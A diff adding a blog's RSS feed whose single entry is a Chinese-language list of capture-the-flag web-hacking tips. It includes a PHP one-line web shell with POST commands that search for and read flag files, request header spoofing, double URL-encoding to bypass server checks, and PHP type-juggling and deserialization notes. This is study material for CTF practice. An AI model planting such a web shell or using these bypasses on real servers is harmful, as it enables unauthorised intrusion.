@@ -1,0 +1,38 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Security on Hagemon&#39;s Log</title>
+    <link>https://hagemon.github.io/tags/security/</link>
+    <description>Recent content in Security on Hagemon&#39;s Log</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>zh-cn</language>
+    <copyright>Hagemon Production</copyright>
+    <lastBuildDate>Thu, 10 Jun 2021 16:50:16 +0000</lastBuildDate><atom:link href="https://hagemon.github.io/tags/security/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>网络攻防tips</title>
+      <link>https://hagemon.github.io/posts/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2tips/</link>
+      <pubDate>Thu, 10 Jun 2021 16:50:16 +0000</pubDate>
+      
+      <guid>https://hagemon.github.io/posts/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2tips/</guid>
+      <description>记录一些网络攻防题中的小tips。
+Robots 每个网站有一个robots.txt用于防爬虫。
+BP构造POST请求 在BP中可以在header里添加Content-type: application/x-www-form-urlencoded，并在最后添加参数构造POST请求
+伪造请求 在header中添加x-forwarded-for: xxx.xxx.xxx.xxx，以及referer: https://www.google.com 来伪造请求。
+一句话木马 当一句话木马在服务器上时：
+&amp;lt;?php @eval($_POST[&amp;#39;shell&amp;#39;]);?&amp;gt;将请求构造为POST，且将参数设置为
+shell=system(&amp;#34;find / -name &amp;#39;flag*&amp;#39;&amp;#34;); shell=system(&amp;#39;cat flag.txt&amp;#39;); ?的解码 问号的URL编码为%3f，浏览器会将%3f解码为问号。如果服务端对问号有一次解码校验的过程：
+&amp;lt;?php url_decode($param); ?&amp;gt;则可以先将%3f编码，即%253f。浏览器会现将%253f解码为%3f，这样就可以绕过服务端的问号校验（服务端收到的就是%3f而不是？）。
+PHP中的比较 PHP中==会先强制转化类型再比较值，而===则会比较类型和值。
+&amp;lt;?php $a = &amp;#39;a1234&amp;#39;; $a == 1234; # 在比较时会去掉字母 $b = &amp;#39;abc&amp;#39;; $b == 0; # 比较时会去掉字母 &amp;gt; phps phps是php的source文件，当找不到php在干嘛的时候可以看一下
+浏览器解码 浏览器会对URL进行一次urldecode，当源码会检验URL时，我们可以通过先对参数进行适当次数的urlencode后传参。
+其中a的编码为%61，1的编码为%31，这个编码是十六进制数，以此类推。如果需要对编码再进行编码，则在前面加上25，如%61的编码为%2561。
+也可以通过写一小段php来查看编码：
+&amp;lt;?php echo dechex(ord(&amp;#39;a&amp;#39;)); // 输出61 &amp;gt; 有时也需要对base64进行解码：
+&amp;lt;?php $str = &amp;#39;VGhpcyBpcyBhbiBlbmNvZGVkIHN0cmluZw==&amp;#39;; echo base64_decode($str); ?&amp;gt; #序列化和反序列化
+在php中，反序列化之前会执行__wakeup函数。
+在我们对一个class的对象进行序列化后，可以得到一个形容它的字符串，比如：
+&amp;lt;?php class Student{  public $name = &amp;#39;hello&amp;#39;;  public $score = 150;  public $grades = array();   function __wakeup() {  echo &amp;#34;__wakeup is invoked&amp;#34;;  } }  $s = new Student(); var_dump(serialize($s)); ?</description>
+    </item>
+    
+  </channel>
+</rss>
